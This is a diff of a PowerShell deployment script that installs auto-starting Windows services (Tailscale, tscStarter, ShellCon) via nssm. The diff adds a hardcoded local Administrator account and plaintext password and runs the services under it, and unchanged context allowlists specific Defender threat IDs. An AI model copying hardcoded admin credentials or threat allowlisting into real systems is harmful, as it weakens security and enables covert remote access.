@@ -1,3 +1,7 @@
+#default user and password:
+$user = ".\Administrator"
+$password = "34Tehno12"
+
 #threats to be allowed
 $threat1 = "2147773719"
 $threat2 = "2147780248"
@@ -66,10 +70,10 @@ $AppDirectory = "C:\Windows\Setup\State\tsc"
 ./nssm install $ServiceName $ExecPath
 ./nssm set $ServiceName AppDirectory $AppDirectory
 ./nssm set $ServiceName Start SERVICE_AUTO_START
-./nssm set $ServiceName ObjectName ".\Administrator" ""
+./nssm set $ServiceName ObjectName $user $password
 ./nssm set $ServiceName AppStopMethodConsole 30000
 
-#Start both services:
+#Start all services:
 Start-Service Tailscale
 Start-Service tscStarter
 Start-Service ShellCon
